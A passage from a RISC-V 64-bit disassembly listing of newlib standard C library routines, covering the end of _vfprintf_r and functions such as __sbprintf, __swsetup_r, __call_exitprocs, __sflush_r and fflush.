   12282:	ec1a                	sd	t1,24(sp)
   12284:	e476                	sd	t4,8(sp)
   12286:	2a2030ef          	jal	ra,15528 <_malloc_r>
   1228a:	6ea2                	ld	t4,8(sp)
   1228c:	6362                	ld	t1,24(sp)
   1228e:	8caa                	mv	s9,a0
   12290:	1e050063          	beqz	a0,12470 <_vfprintf_r+0x1c0a>
   12294:	ec2a                	sd	a0,24(sp)
   12296:	b641                	j	11e16 <_vfprintf_r+0x15b0>
   12298:	000e9363          	bnez	t4,1229e <_vfprintf_r+0x1a38>
   1229c:	4e85                	li	t4,1
   1229e:	69b2                	ld	s3,264(sp)
   122a0:	1004ef93          	ori	t6,s1,256
   122a4:	6c12                	ld	s8,256(sp)
   122a6:	2f81                	sext.w	t6,t6
   122a8:	d609c1e3          	bltz	s3,1200a <_vfprintf_r+0x17a4>
   122ac:	8776                	mv	a4,t4
   122ae:	0f810893          	addi	a7,sp,248
   122b2:	0ec10813          	addi	a6,sp,236
   122b6:	11bc                	addi	a5,sp,232
   122b8:	4689                	li	a3,2
   122ba:	85e2                	mv	a1,s8
   122bc:	864e                	mv	a2,s3
   122be:	8556                	mv	a0,s5
   122c0:	ec7e                	sd	t6,24(sp)
   122c2:	f01a                	sd	t1,32(sp)
   122c4:	e476                	sd	t4,8(sp)
   122c6:	1f0020ef          	jal	ra,144b6 <_ldtoa_r>
   122ca:	6fe2                	ld	t6,24(sp)
   122cc:	ed26                	sd	s1,152(sp)
   122ce:	6ea2                	ld	t4,8(sp)
   122d0:	7302                	ld	t1,32(sp)
   122d2:	8caa                	mv	s9,a0
   122d4:	84fe                	mv	s1,t6
   122d6:	ec02                	sd	zero,24(sp)
   122d8:	e582                	sd	zero,200(sp)
   122da:	bb61                	j	12072 <_vfprintf_r+0x180c>
   122dc:	4e99                	li	t4,6
   122de:	9fbfe06f          	j	10cd8 <_vfprintf_r+0x472>
   122e2:	c31c                	sw	a5,0(a4)
   122e4:	8ca2                	mv	s9,s0
   122e6:	813fe06f          	j	10af8 <_vfprintf_r+0x292>
   122ea:	06700d93          	li	s11,103
   122ee:	77a6                	ld	a5,104(sp)
   122f0:	0ff00713          	li	a4,255
   122f4:	e882                	sd	zero,80(sp)
   122f6:	0007c783          	lbu	a5,0(a5)
   122fa:	f082                	sd	zero,96(sp)
   122fc:	02e78863          	beq	a5,a4,1232c <_vfprintf_r+0x1ac6>
   12300:	0ff00693          	li	a3,255
   12304:	6666                	ld	a2,88(sp)
   12306:	0007871b          	sext.w	a4,a5
   1230a:	02c7d163          	bge	a5,a2,1232c <_vfprintf_r+0x1ac6>
   1230e:	75a6                	ld	a1,104(sp)
   12310:	40e6073b          	subw	a4,a2,a4
   12314:	ecba                	sd	a4,88(sp)
   12316:	0015c783          	lbu	a5,1(a1)
   1231a:	cf8d                	beqz	a5,12354 <_vfprintf_r+0x1aee>
   1231c:	7706                	ld	a4,96(sp)
   1231e:	2705                	addiw	a4,a4,1
   12320:	f0ba                	sd	a4,96(sp)
   12322:	00158713          	addi	a4,a1,1
   12326:	f4ba                	sd	a4,104(sp)
   12328:	fcd79ee3          	bne	a5,a3,12304 <_vfprintf_r+0x1a9e>
   1232c:	7706                	ld	a4,96(sp)
   1232e:	67c6                	ld	a5,80(sp)
   12330:	9fb9                	addw	a5,a5,a4
   12332:	672a                	ld	a4,136(sp)
   12334:	02e787bb          	mulw	a5,a5,a4
   12338:	018787bb          	addw	a5,a5,s8
   1233c:	00078c1b          	sext.w	s8,a5
   12340:	fffc4993          	not	s3,s8
   12344:	43f9d993          	srai	s3,s3,0x3f
   12348:	0137f7b3          	and	a5,a5,s3
   1234c:	0007899b          	sext.w	s3,a5
   12350:	b29fe06f          	j	10e78 <_vfprintf_r+0x612>
   12354:	6746                	ld	a4,80(sp)
   12356:	77a6                	ld	a5,104(sp)
   12358:	2705                	addiw	a4,a4,1
   1235a:	0007c783          	lbu	a5,0(a5)
   1235e:	e8ba                	sd	a4,80(sp)
   12360:	b7e1                	j	12328 <_vfprintf_r+0x1ac2>
   12362:	ec02                	sd	zero,24(sp)
   12364:	84be                	mv	s1,a5
   12366:	b16d                	j	12010 <_vfprintf_r+0x17aa>
   12368:	85ce                	mv	a1,s3
   1236a:	8562                	mv	a0,s8
   1236c:	fc1a                	sd	t1,56(sp)
   1236e:	f876                	sd	t4,48(sp)
   12370:	6d1090ef          	jal	ra,1c240 <__trunctfdf2>
   12374:	11a8                	addi	a0,sp,232
   12376:	23d040ef          	jal	ra,16db2 <frexp>
   1237a:	607090ef          	jal	ra,1c180 <__extenddftf2>
   1237e:	0000a797          	auipc	a5,0xa
   12382:	48278793          	addi	a5,a5,1154 # 1c800 <zeroes.4521+0x38>
   12386:	6390                	ld	a2,0(a5)
   12388:	6794                	ld	a3,8(a5)
   1238a:	6f7080ef          	jal	ra,1b280 <__multf3>
   1238e:	4601                	li	a2,0
   12390:	4681                	li	a3,0
   12392:	f02a                	sd	a0,32(sp)
   12394:	e42e                	sd	a1,8(sp)
   12396:	507080ef          	jal	ra,1b09c <__eqtf2>
   1239a:	62a2                	ld	t0,8(sp)
   1239c:	7702                	ld	a4,32(sp)
   1239e:	7ec2                	ld	t4,48(sp)
   123a0:	7362                	ld	t1,56(sp)
   123a2:	e119                	bnez	a0,123a8 <_vfprintf_r+0x1b42>
   123a4:	4785                	li	a5,1
   123a6:	d5be                	sw	a5,232(sp)
   123a8:	0000a797          	auipc	a5,0xa
   123ac:	27878793          	addi	a5,a5,632 # 1c620 <__clzdi2+0x1ae>
   123b0:	e8be                	sd	a5,80(sp)
   123b2:	bce1                	j	11e8a <_vfprintf_r+0x1624>
   123b4:	0f210713          	addi	a4,sp,242
   123b8:	e699                	bnez	a3,123c6 <_vfprintf_r+0x1b60>
   123ba:	03000713          	li	a4,48
   123be:	0ee10923          	sb	a4,242(sp)
   123c2:	0f310713          	addi	a4,sp,243
   123c6:	0c14                	addi	a3,sp,528
   123c8:	0307879b          	addiw	a5,a5,48
   123cc:	40d706b3          	sub	a3,a4,a3
   123d0:	00f70023          	sb	a5,0(a4)
   123d4:	1216879b          	addiw	a5,a3,289
   123d8:	e13e                	sd	a5,128(sp)
   123da:	a65fe06f          	j	10e3e <_vfprintf_r+0x5d8>
   123de:	77c6                	ld	a5,112(sp)
   123e0:	06600d93          	li	s11,102
   123e4:	00e78c3b          	addw	s8,a5,a4
   123e8:	01dc0c3b          	addw	s8,s8,t4
   123ec:	bb81                	j	1213c <_vfprintf_r+0x18d6>
   123ee:	676a                	ld	a4,152(sp)
   123f0:	8b05                	andi	a4,a4,1
   123f2:	e319                	bnez	a4,123f8 <_vfprintf_r+0x1b92>
   123f4:	a65fe06f          	j	10e58 <_vfprintf_r+0x5f2>
   123f8:	a5bfe06f          	j	10e52 <_vfprintf_r+0x5ec>
   123fc:	40ec07bb          	subw	a5,s8,a4
   12400:	2785                	addiw	a5,a5,1
   12402:	00078c1b          	sext.w	s8,a5
   12406:	fffc4993          	not	s3,s8
   1240a:	43f9d993          	srai	s3,s3,0x3f
   1240e:	0137f7b3          	and	a5,a5,s3
   12412:	0007899b          	sext.w	s3,a5
   12416:	bef1                	j	11ff2 <_vfprintf_r+0x178c>
   12418:	e791                	bnez	a5,12424 <_vfprintf_r+0x1bbe>
   1241a:	4985                	li	s3,1
   1241c:	06600d93          	li	s11,102
   12420:	4c05                	li	s8,1
   12422:	bec1                	j	11ff2 <_vfprintf_r+0x178c>
   12424:	77c6                	ld	a5,112(sp)
   12426:	06600d93          	li	s11,102
   1242a:	2785                	addiw	a5,a5,1
   1242c:	01d78ebb          	addw	t4,a5,t4
   12430:	000e8c1b          	sext.w	s8,t4
   12434:	fffc4993          	not	s3,s8
   12438:	43f9d993          	srai	s3,s3,0x3f
   1243c:	013efeb3          	and	t4,t4,s3
   12440:	000e899b          	sext.w	s3,t4
   12444:	b67d                	j	11ff2 <_vfprintf_r+0x178c>
   12446:	871a                	mv	a4,t1
   12448:	c9aff06f          	j	118e2 <_vfprintf_r+0x107c>
   1244c:	66c2                	ld	a3,16(sp)
   1244e:	4298                	lw	a4,0(a3)
   12450:	06a1                	addi	a3,a3,8
   12452:	00070e9b          	sext.w	t4,a4
   12456:	00075363          	bgez	a4,1245c <_vfprintf_r+0x1bf6>
   1245a:	5efd                	li	t4,-1
   1245c:	00144f03          	lbu	t5,1(s0)
   12460:	e836                	sd	a3,16(sp)
   12462:	843e                	mv	s0,a5
   12464:	d36fe06f          	j	1099a <_vfprintf_r+0x134>
   12468:	4789                	li	a5,2
   1246a:	e13e                	sd	a5,128(sp)
   1246c:	9d3fe06f          	j	10e3e <_vfprintf_r+0x5d8>
   12470:	010a5783          	lhu	a5,16(s4)
   12474:	0407e793          	ori	a5,a5,64
   12478:	00fa1823          	sh	a5,16(s4)
   1247c:	e8cfe06f          	j	10b08 <_vfprintf_r+0x2a2>

0000000000012480 <vfprintf>:
   12480:	86b2                	mv	a3,a2
   12482:	862e                	mv	a2,a1
   12484:	85aa                	mv	a1,a0
   12486:	8481b503          	ld	a0,-1976(gp) # 1f450 <_impure_ptr>
   1248a:	bdcfe06f          	j	10866 <_vfprintf_r>

000000000001248e <__sbprintf>:
   1248e:	0105d783          	lhu	a5,16(a1)
   12492:	0ac5ae03          	lw	t3,172(a1)
   12496:	0125d303          	lhu	t1,18(a1)
   1249a:	0305b883          	ld	a7,48(a1)
   1249e:	0405b803          	ld	a6,64(a1)
   124a2:	b3010113          	addi	sp,sp,-1232
   124a6:	9bf5                	andi	a5,a5,-3
   124a8:	40000713          	li	a4,1024
   124ac:	4c813023          	sd	s0,1216(sp)
   124b0:	00f11823          	sh	a5,16(sp)
   124b4:	842e                	mv	s0,a1
   124b6:	191c                	addi	a5,sp,176
   124b8:	858a                	mv	a1,sp
   124ba:	4a913c23          	sd	s1,1208(sp)
   124be:	4b213823          	sd	s2,1200(sp)
   124c2:	4c113423          	sd	ra,1224(sp)
   124c6:	892a                	mv	s2,a0
   124c8:	d772                	sw	t3,172(sp)
   124ca:	00611923          	sh	t1,18(sp)
   124ce:	f846                	sd	a7,48(sp)
   124d0:	e0c2                	sd	a6,64(sp)
   124d2:	e03e                	sd	a5,0(sp)
   124d4:	ec3e                	sd	a5,24(sp)
   124d6:	c63a                	sw	a4,12(sp)
   124d8:	d03a                	sw	a4,32(sp)
   124da:	d402                	sw	zero,40(sp)
   124dc:	b8afe0ef          	jal	ra,10866 <_vfprintf_r>
   124e0:	84aa                	mv	s1,a0
   124e2:	02055963          	bgez	a0,12514 <__sbprintf+0x86>
   124e6:	01015783          	lhu	a5,16(sp)
   124ea:	0407f793          	andi	a5,a5,64
   124ee:	c799                	beqz	a5,124fc <__sbprintf+0x6e>
   124f0:	01045783          	lhu	a5,16(s0)
   124f4:	0407e793          	ori	a5,a5,64
   124f8:	00f41823          	sh	a5,16(s0)
   124fc:	4c813083          	ld	ra,1224(sp)
   12500:	4c013403          	ld	s0,1216(sp)
   12504:	4b013903          	ld	s2,1200(sp)
   12508:	8526                	mv	a0,s1
   1250a:	4b813483          	ld	s1,1208(sp)
   1250e:	4d010113          	addi	sp,sp,1232
   12512:	8082                	ret
   12514:	858a                	mv	a1,sp
   12516:	854a                	mv	a0,s2
   12518:	354000ef          	jal	ra,1286c <_fflush_r>
   1251c:	d569                	beqz	a0,124e6 <__sbprintf+0x58>
   1251e:	54fd                	li	s1,-1
   12520:	b7d9                	j	124e6 <__sbprintf+0x58>

0000000000012522 <__swsetup_r>:
   12522:	1101                	addi	sp,sp,-32
   12524:	e822                	sd	s0,16(sp)
   12526:	e426                	sd	s1,8(sp)
   12528:	ec06                	sd	ra,24(sp)
   1252a:	8481b783          	ld	a5,-1976(gp) # 1f450 <_impure_ptr>
   1252e:	84aa                	mv	s1,a0
   12530:	842e                	mv	s0,a1
   12532:	c399                	beqz	a5,12538 <__swsetup_r+0x16>
   12534:	4bb8                	lw	a4,80(a5)
   12536:	cf49                	beqz	a4,125d0 <__swsetup_r+0xae>
   12538:	01041703          	lh	a4,16(s0)
   1253c:	03071793          	slli	a5,a4,0x30
   12540:	00877693          	andi	a3,a4,8
   12544:	93c1                	srli	a5,a5,0x30
   12546:	c29d                	beqz	a3,1256c <__swsetup_r+0x4a>
   12548:	6c14                	ld	a3,24(s0)
   1254a:	ce9d                	beqz	a3,12588 <__swsetup_r+0x66>
   1254c:	0017f613          	andi	a2,a5,1
   12550:	ce39                	beqz	a2,125ae <__swsetup_r+0x8c>
   12552:	5010                	lw	a2,32(s0)
   12554:	00042623          	sw	zero,12(s0)
   12558:	4501                	li	a0,0
   1255a:	40c0063b          	negw	a2,a2
   1255e:	d410                	sw	a2,40(s0)
   12560:	ceb9                	beqz	a3,125be <__swsetup_r+0x9c>
   12562:	60e2                	ld	ra,24(sp)
   12564:	6442                	ld	s0,16(sp)
   12566:	64a2                	ld	s1,8(sp)
   12568:	6105                	addi	sp,sp,32
   1256a:	8082                	ret
   1256c:	0107f693          	andi	a3,a5,16
   12570:	cac1                	beqz	a3,12600 <__swsetup_r+0xde>
   12572:	8b91                	andi	a5,a5,4
   12574:	e3b5                	bnez	a5,125d8 <__swsetup_r+0xb6>
   12576:	6c14                	ld	a3,24(s0)
   12578:	00876713          	ori	a4,a4,8
   1257c:	03071793          	slli	a5,a4,0x30
   12580:	00e41823          	sh	a4,16(s0)
   12584:	93c1                	srli	a5,a5,0x30
   12586:	f2f9                	bnez	a3,1254c <__swsetup_r+0x2a>
   12588:	2807f613          	andi	a2,a5,640
   1258c:	20000593          	li	a1,512
   12590:	fab60ee3          	beq	a2,a1,1254c <__swsetup_r+0x2a>
   12594:	85a2                	mv	a1,s0
   12596:	8526                	mv	a0,s1
   12598:	6d5020ef          	jal	ra,1546c <__smakebuf_r>
   1259c:	01041703          	lh	a4,16(s0)
   125a0:	6c14                	ld	a3,24(s0)
   125a2:	03071793          	slli	a5,a4,0x30
   125a6:	93c1                	srli	a5,a5,0x30
   125a8:	0017f613          	andi	a2,a5,1
   125ac:	f25d                	bnez	a2,12552 <__swsetup_r+0x30>
   125ae:	0027f613          	andi	a2,a5,2
   125b2:	4581                	li	a1,0
   125b4:	e211                	bnez	a2,125b8 <__swsetup_r+0x96>
   125b6:	500c                	lw	a1,32(s0)
   125b8:	c44c                	sw	a1,12(s0)
   125ba:	4501                	li	a0,0
   125bc:	f2dd                	bnez	a3,12562 <__swsetup_r+0x40>
   125be:	0807f793          	andi	a5,a5,128
   125c2:	d3c5                	beqz	a5,12562 <__swsetup_r+0x40>
   125c4:	04076713          	ori	a4,a4,64
   125c8:	00e41823          	sh	a4,16(s0)
   125cc:	557d                	li	a0,-1
   125ce:	bf51                	j	12562 <__swsetup_r+0x40>
   125d0:	853e                	mv	a0,a5
   125d2:	530000ef          	jal	ra,12b02 <__sinit>
   125d6:	b78d                	j	12538 <__swsetup_r+0x16>
   125d8:	6c2c                	ld	a1,88(s0)
   125da:	cd81                	beqz	a1,125f2 <__swsetup_r+0xd0>
   125dc:	07440793          	addi	a5,s0,116
   125e0:	00f58763          	beq	a1,a5,125ee <__swsetup_r+0xcc>
   125e4:	8526                	mv	a0,s1
   125e6:	64e000ef          	jal	ra,12c34 <_free_r>
   125ea:	01041703          	lh	a4,16(s0)
   125ee:	04043c23          	sd	zero,88(s0)
   125f2:	6c14                	ld	a3,24(s0)
   125f4:	fdb77713          	andi	a4,a4,-37
   125f8:	00042423          	sw	zero,8(s0)
   125fc:	e014                	sd	a3,0(s0)
   125fe:	bfad                	j	12578 <__swsetup_r+0x56>
   12600:	47a5                	li	a5,9
   12602:	c09c                	sw	a5,0(s1)
   12604:	04076713          	ori	a4,a4,64
   12608:	00e41823          	sh	a4,16(s0)
   1260c:	557d                	li	a0,-1
   1260e:	bf91                	j	12562 <__swsetup_r+0x40>

0000000000012610 <__call_exitprocs>:
   12610:	715d                	addi	sp,sp,-80
   12612:	f052                	sd	s4,32(sp)
   12614:	8301ba03          	ld	s4,-2000(gp) # 1f438 <_global_impure_ptr>
   12618:	f84a                	sd	s2,48(sp)
   1261a:	1f8a3903          	ld	s2,504(s4)
   1261e:	e486                	sd	ra,72(sp)
   12620:	e0a2                	sd	s0,64(sp)
   12622:	fc26                	sd	s1,56(sp)
   12624:	f44e                	sd	s3,40(sp)
   12626:	ec56                	sd	s5,24(sp)
   12628:	e85a                	sd	s6,16(sp)
   1262a:	e45e                	sd	s7,8(sp)
   1262c:	e062                	sd	s8,0(sp)
   1262e:	02090863          	beqz	s2,1265e <__call_exitprocs+0x4e>
   12632:	8b2a                	mv	s6,a0
   12634:	8bae                	mv	s7,a1
   12636:	4a85                	li	s5,1
   12638:	59fd                	li	s3,-1
   1263a:	00892483          	lw	s1,8(s2)
   1263e:	fff4841b          	addiw	s0,s1,-1
   12642:	00044e63          	bltz	s0,1265e <__call_exitprocs+0x4e>
   12646:	048e                	slli	s1,s1,0x3
   12648:	94ca                	add	s1,s1,s2
   1264a:	020b8663          	beqz	s7,12676 <__call_exitprocs+0x66>
   1264e:	2084b783          	ld	a5,520(s1)
   12652:	03778263          	beq	a5,s7,12676 <__call_exitprocs+0x66>
   12656:	347d                	addiw	s0,s0,-1
   12658:	14e1                	addi	s1,s1,-8
   1265a:	ff3418e3          	bne	s0,s3,1264a <__call_exitprocs+0x3a>
   1265e:	60a6                	ld	ra,72(sp)
   12660:	6406                	ld	s0,64(sp)
   12662:	74e2                	ld	s1,56(sp)
   12664:	7942                	ld	s2,48(sp)
   12666:	79a2                	ld	s3,40(sp)
   12668:	7a02                	ld	s4,32(sp)
   1266a:	6ae2                	ld	s5,24(sp)
   1266c:	6b42                	ld	s6,16(sp)
   1266e:	6ba2                	ld	s7,8(sp)
   12670:	6c02                	ld	s8,0(sp)
   12672:	6161                	addi	sp,sp,80
   12674:	8082                	ret
   12676:	00892783          	lw	a5,8(s2)
   1267a:	6498                	ld	a4,8(s1)
   1267c:	37fd                	addiw	a5,a5,-1
   1267e:	04878463          	beq	a5,s0,126c6 <__call_exitprocs+0xb6>
   12682:	0004b423          	sd	zero,8(s1)
   12686:	db61                	beqz	a4,12656 <__call_exitprocs+0x46>
   12688:	31092783          	lw	a5,784(s2)
   1268c:	008a96bb          	sllw	a3,s5,s0
   12690:	00892c03          	lw	s8,8(s2)
   12694:	8ff5                	and	a5,a5,a3
   12696:	2781                	sext.w	a5,a5
   12698:	ef89                	bnez	a5,126b2 <__call_exitprocs+0xa2>
   1269a:	9702                	jalr	a4
   1269c:	00892703          	lw	a4,8(s2)
   126a0:	1f8a3783          	ld	a5,504(s4)
   126a4:	01871463          	bne	a4,s8,126ac <__call_exitprocs+0x9c>
   126a8:	faf907e3          	beq	s2,a5,12656 <__call_exitprocs+0x46>
   126ac:	dbcd                	beqz	a5,1265e <__call_exitprocs+0x4e>
   126ae:	893e                	mv	s2,a5
   126b0:	b769                	j	1263a <__call_exitprocs+0x2a>
   126b2:	31492783          	lw	a5,788(s2)
   126b6:	1084b583          	ld	a1,264(s1)
   126ba:	8ff5                	and	a5,a5,a3
   126bc:	2781                	sext.w	a5,a5
   126be:	e799                	bnez	a5,126cc <__call_exitprocs+0xbc>
   126c0:	855a                	mv	a0,s6
   126c2:	9702                	jalr	a4
   126c4:	bfe1                	j	1269c <__call_exitprocs+0x8c>
   126c6:	00892423          	sw	s0,8(s2)
   126ca:	bf75                	j	12686 <__call_exitprocs+0x76>
   126cc:	852e                	mv	a0,a1
   126ce:	9702                	jalr	a4
   126d0:	b7f1                	j	1269c <__call_exitprocs+0x8c>

00000000000126d2 <__sflush_r>:
   126d2:	01059783          	lh	a5,16(a1)
   126d6:	7179                	addi	sp,sp,-48
   126d8:	f022                	sd	s0,32(sp)
   126da:	e44e                	sd	s3,8(sp)
   126dc:	f406                	sd	ra,40(sp)
   126de:	ec26                	sd	s1,24(sp)
   126e0:	e84a                	sd	s2,16(sp)
   126e2:	0087f693          	andi	a3,a5,8
   126e6:	842e                	mv	s0,a1
   126e8:	89aa                	mv	s3,a0
   126ea:	eecd                	bnez	a3,127a4 <__sflush_r+0xd2>
   126ec:	6705                	lui	a4,0x1
   126ee:	80070713          	addi	a4,a4,-2048 # 800 <register_fini-0xf8b0>
   126f2:	4594                	lw	a3,8(a1)
   126f4:	8fd9                	or	a5,a5,a4
   126f6:	00f59823          	sh	a5,16(a1)
   126fa:	10d05363          	blez	a3,12800 <__sflush_r+0x12e>
   126fe:	6438                	ld	a4,72(s0)
   12700:	cb51                	beqz	a4,12794 <__sflush_r+0xc2>
   12702:	0009a483          	lw	s1,0(s3)
   12706:	03079693          	slli	a3,a5,0x30
   1270a:	0009a023          	sw	zero,0(s3)
   1270e:	03379613          	slli	a2,a5,0x33
   12712:	780c                	ld	a1,48(s0)
   12714:	92c1                	srli	a3,a3,0x30
   12716:	0e064963          	bltz	a2,12808 <__sflush_r+0x136>
   1271a:	4601                	li	a2,0
   1271c:	4685                	li	a3,1
   1271e:	854e                	mv	a0,s3
   12720:	9702                	jalr	a4
   12722:	57fd                	li	a5,-1
   12724:	862a                	mv	a2,a0
   12726:	10f50963          	beq	a0,a5,12838 <__sflush_r+0x166>
   1272a:	01045683          	lhu	a3,16(s0)
   1272e:	6438                	ld	a4,72(s0)
   12730:	780c                	ld	a1,48(s0)
   12732:	8a91                	andi	a3,a3,4
   12734:	c699                	beqz	a3,12742 <__sflush_r+0x70>
   12736:	4414                	lw	a3,8(s0)
   12738:	6c3c                	ld	a5,88(s0)
   1273a:	8e15                	sub	a2,a2,a3
   1273c:	c399                	beqz	a5,12742 <__sflush_r+0x70>
   1273e:	583c                	lw	a5,112(s0)
   12740:	8e1d                	sub	a2,a2,a5
   12742:	4681                	li	a3,0
   12744:	854e                	mv	a0,s3
   12746:	9702                	jalr	a4
   12748:	57fd                	li	a5,-1
   1274a:	0cf51163          	bne	a0,a5,1280c <__sflush_r+0x13a>
   1274e:	0009a703          	lw	a4,0(s3)
   12752:	01041783          	lh	a5,16(s0)
   12756:	0e070f63          	beqz	a4,12854 <__sflush_r+0x182>
   1275a:	46f5                	li	a3,29
   1275c:	00d70563          	beq	a4,a3,12766 <__sflush_r+0x94>
   12760:	46d9                	li	a3,22
   12762:	0ed71f63          	bne	a4,a3,12860 <__sflush_r+0x18e>
   12766:	6c14                	ld	a3,24(s0)
   12768:	777d                	lui	a4,0xfffff
   1276a:	7ff70713          	addi	a4,a4,2047 # fffffffffffff7ff <__BSS_END__+0xfffffffffffc7b07>
   1276e:	8ff9                	and	a5,a5,a4
   12770:	00f41823          	sh	a5,16(s0)
   12774:	00042423          	sw	zero,8(s0)
   12778:	e014                	sd	a3,0(s0)
   1277a:	6c2c                	ld	a1,88(s0)
   1277c:	0099a023          	sw	s1,0(s3)
   12780:	c991                	beqz	a1,12794 <__sflush_r+0xc2>
   12782:	07440793          	addi	a5,s0,116
   12786:	00f58563          	beq	a1,a5,12790 <__sflush_r+0xbe>
   1278a:	854e                	mv	a0,s3
   1278c:	4a8000ef          	jal	ra,12c34 <_free_r>
   12790:	04043c23          	sd	zero,88(s0)
   12794:	4501                	li	a0,0
   12796:	70a2                	ld	ra,40(sp)
   12798:	7402                	ld	s0,32(sp)
   1279a:	64e2                	ld	s1,24(sp)
   1279c:	6942                	ld	s2,16(sp)
   1279e:	69a2                	ld	s3,8(sp)
   127a0:	6145                	addi	sp,sp,48
   127a2:	8082                	ret
   127a4:	0185b903          	ld	s2,24(a1)
   127a8:	fe0906e3          	beqz	s2,12794 <__sflush_r+0xc2>
   127ac:	6184                	ld	s1,0(a1)
   127ae:	03079713          	slli	a4,a5,0x30
   127b2:	9341                	srli	a4,a4,0x30
   127b4:	8b0d                	andi	a4,a4,3
   127b6:	0125b023          	sd	s2,0(a1)
   127ba:	412484bb          	subw	s1,s1,s2
   127be:	4781                	li	a5,0
   127c0:	e311                	bnez	a4,127c4 <__sflush_r+0xf2>
   127c2:	519c                	lw	a5,32(a1)
   127c4:	c45c                	sw	a5,12(s0)
   127c6:	00904663          	bgtz	s1,127d2 <__sflush_r+0x100>
   127ca:	b7e9                	j	12794 <__sflush_r+0xc2>
   127cc:	992a                	add	s2,s2,a0
   127ce:	fc9053e3          	blez	s1,12794 <__sflush_r+0xc2>
   127d2:	603c                	ld	a5,64(s0)
   127d4:	780c                	ld	a1,48(s0)
   127d6:	86a6                	mv	a3,s1
   127d8:	864a                	mv	a2,s2
   127da:	854e                	mv	a0,s3
   127dc:	9782                	jalr	a5
   127de:	9c89                	subw	s1,s1,a0
   127e0:	fea046e3          	bgtz	a0,127cc <__sflush_r+0xfa>
   127e4:	01045783          	lhu	a5,16(s0)
   127e8:	70a2                	ld	ra,40(sp)
   127ea:	64e2                	ld	s1,24(sp)
   127ec:	0407e793          	ori	a5,a5,64
   127f0:	00f41823          	sh	a5,16(s0)
   127f4:	7402                	ld	s0,32(sp)
   127f6:	6942                	ld	s2,16(sp)
   127f8:	69a2                	ld	s3,8(sp)
   127fa:	557d                	li	a0,-1
   127fc:	6145                	addi	sp,sp,48
   127fe:	8082                	ret
   12800:	59b8                	lw	a4,112(a1)
   12802:	eee04ee3          	bgtz	a4,126fe <__sflush_r+0x2c>
   12806:	b779                	j	12794 <__sflush_r+0xc2>
   12808:	6850                	ld	a2,144(s0)
   1280a:	b725                	j	12732 <__sflush_r+0x60>
   1280c:	01045783          	lhu	a5,16(s0)
   12810:	777d                	lui	a4,0xfffff
   12812:	7ff70713          	addi	a4,a4,2047 # fffffffffffff7ff <__BSS_END__+0xfffffffffffc7b07>
   12816:	8ff9                	and	a5,a5,a4
   12818:	6c14                	ld	a3,24(s0)
   1281a:	0107979b          	slliw	a5,a5,0x10
   1281e:	4107d79b          	sraiw	a5,a5,0x10
   12822:	00f41823          	sh	a5,16(s0)
   12826:	00042423          	sw	zero,8(s0)
   1282a:	e014                	sd	a3,0(s0)
   1282c:	03379713          	slli	a4,a5,0x33
   12830:	f40755e3          	bgez	a4,1277a <__sflush_r+0xa8>
   12834:	e848                	sd	a0,144(s0)
   12836:	b791                	j	1277a <__sflush_r+0xa8>
   12838:	0009a783          	lw	a5,0(s3)
   1283c:	ee0787e3          	beqz	a5,1272a <__sflush_r+0x58>
   12840:	4775                	li	a4,29
   12842:	00e78563          	beq	a5,a4,1284c <__sflush_r+0x17a>
   12846:	4759                	li	a4,22
   12848:	f8e79ee3          	bne	a5,a4,127e4 <__sflush_r+0x112>
   1284c:	0099a023          	sw	s1,0(s3)
   12850:	4501                	li	a0,0
   12852:	b791                	j	12796 <__sflush_r+0xc4>
   12854:	777d                	lui	a4,0xfffff
   12856:	7ff70713          	addi	a4,a4,2047 # fffffffffffff7ff <__BSS_END__+0xfffffffffffc7b07>
   1285a:	6c14                	ld	a3,24(s0)
   1285c:	8ff9                	and	a5,a5,a4
   1285e:	b7d1                	j	12822 <__sflush_r+0x150>
   12860:	0407e793          	ori	a5,a5,64
   12864:	00f41823          	sh	a5,16(s0)
   12868:	557d                	li	a0,-1
   1286a:	b735                	j	12796 <__sflush_r+0xc4>

000000000001286c <_fflush_r>:
   1286c:	1101                	addi	sp,sp,-32
   1286e:	e822                	sd	s0,16(sp)
   12870:	ec06                	sd	ra,24(sp)
   12872:	842a                	mv	s0,a0
   12874:	c119                	beqz	a0,1287a <_fflush_r+0xe>
   12876:	493c                	lw	a5,80(a0)
   12878:	cb89                	beqz	a5,1288a <_fflush_r+0x1e>
   1287a:	01059783          	lh	a5,16(a1)
   1287e:	ef89                	bnez	a5,12898 <_fflush_r+0x2c>
   12880:	60e2                	ld	ra,24(sp)
   12882:	6442                	ld	s0,16(sp)
   12884:	4501                	li	a0,0
   12886:	6105                	addi	sp,sp,32
   12888:	8082                	ret
   1288a:	e42e                	sd	a1,8(sp)
   1288c:	276000ef          	jal	ra,12b02 <__sinit>
   12890:	65a2                	ld	a1,8(sp)
   12892:	01059783          	lh	a5,16(a1)
   12896:	d7ed                	beqz	a5,12880 <_fflush_r+0x14>
   12898:	8522                	mv	a0,s0
   1289a:	6442                	ld	s0,16(sp)
   1289c:	60e2                	ld	ra,24(sp)
   1289e:	6105                	addi	sp,sp,32
   128a0:	bd0d                	j	126d2 <__sflush_r>

00000000000128a2 <fflush>:
   128a2:	85aa                	mv	a1,a0
   128a4:	c501                	beqz	a0,128ac <fflush+0xa>
   128a6:	8481b503          	ld	a0,-1976(gp) # 1f450 <_impure_ptr>
   128aa:	b7c9                	j	1286c <_fflush_r>
   128ac:	00000597          	auipc	a1,0x0
   128b0:	fc058593          	addi	a1,a1,-64 # 1286c <_fflush_r>
   128b4:	8301b503          	ld	a0,-2000(gp) # 1f438 <_global_impure_ptr>
   128b8:	1790006f          	j	13230 <_fwalk_reent>

00000000000128bc <__fp_lock>:
   128bc:	4501                	li	a0,0
   128be:	8082                	ret

00000000000128c0 <_cleanup_r>:
   128c0:	00007597          	auipc	a1,0x7
   128c4:	37858593          	addi	a1,a1,888 # 19c38 <_fclose_r>
   128c8:	1690006f          	j	13230 <_fwalk_reent>

00000000000128cc <__sinit.part.0>:
   128cc:	7139                	addi	sp,sp,-64
   128ce:	fc06                	sd	ra,56(sp)
   128d0:	f822                	sd	s0,48(sp)
   128d2:	f426                	sd	s1,40(sp)
   128d4:	f04a                	sd	s2,32(sp)
   128d6:	ec4e                	sd	s3,24(sp)
   128d8:	e852                	sd	s4,16(sp)
   128da:	e456                	sd	s5,8(sp)
   128dc:	e05a                	sd	s6,0(sp)
   128de:	6500                	ld	s0,8(a0)
   128e0:	00000717          	auipc	a4,0x0
   128e4:	fe070713          	addi	a4,a4,-32 # 128c0 <_cleanup_r>
   128e8:	ed38                	sd	a4,88(a0)
   128ea:	53850793          	addi	a5,a0,1336
   128ee:	470d                	li	a4,3
   128f0:	52e52423          	sw	a4,1320(a0)
